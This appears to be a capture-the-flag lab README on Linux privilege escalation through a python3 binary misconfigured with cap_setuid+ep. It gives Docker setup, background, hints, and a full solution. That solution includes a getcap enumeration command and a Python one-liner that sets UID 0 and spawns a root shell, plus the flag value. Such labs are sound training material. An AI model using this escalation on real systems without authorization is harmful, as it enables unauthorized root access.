# Challenge 1  Linux Capabilities Abuse

**Difficulty:** Medium  
**Category:** Linux Privilege Escalation  
**Flag:** `/root/flag.txt`

---

## Story

A developer needed Python to perform some low-level system operations.
Rather than running the whole script as root, they decided to use Linux capabilities 
a more "granular" approach. Or so they thought.

You have a shell as `player`. Find what they misconfigured.

---

## Setup

```bash
docker build -t ctf-linux-med-1 .
docker run -it --rm --cap-add ALL ctf-linux-med-1
```

---

## Background: Linux Capabilities

Traditional Unix privilege model is binary: root or not root.
Linux capabilities break root's power into individual units.
For example:

| Capability | What it allows |
|---|---|
| `cap_setuid` | Change the process UID (become any user) |
| `cap_net_raw` | Use raw sockets |
| `cap_dac_override` | Bypass file read/write permission checks |

When a binary has `cap_setuid` with the `ep` (effective + permitted) flag,
any user who runs it can call `setuid(0)` inside it  becoming root.

---

## Hints

<details>
<summary>Hint 1</summary>
Enumerate all binaries with assigned capabilities:

```bash
getcap -r / 2>/dev/null
```

Look for anything with `cap_setuid`.
</details>

<details>
<summary>Hint 2</summary>
If a Python binary has `cap_setuid+ep`, you can call `os.setuid(0)` inside it.
After that, any command you run from Python executes as root.
</details>

<details>
<summary>Hint 3</summary>
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
</details>

---

## Solution

<details>
<summary>Click to reveal  try on your own first!</summary>

### Step 1  Enumerate capabilities

```bash
getcap -r / 2>/dev/null
```

Output:
```
/usr/bin/python3.10 = cap_setuid+ep
```

### Step 2  Use Python to set UID to 0 and spawn a root shell

```bash
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

Because `python3` has `cap_setuid+ep`, the `os.setuid(0)` call succeeds.
The resulting `/bin/bash` runs as root.

### Step 3  Read the flag

```bash
cat /root/flag.txt
```

```
CTF{c4p4b1l1t13s_4r3_n0t_h4rml3ss}
```

### Why this works

`cap_setuid+ep` means the capability is in both the **effective** and **permitted** sets
for that binary. Any user who runs it gets to exercise `setuid()`  the kernel allows the
call regardless of the process's real UID. Capabilities should only be assigned to
binaries that genuinely need them, with the minimal scope required, and ideally only
to specific binaries that cannot be misused to spawn shells.

</details>
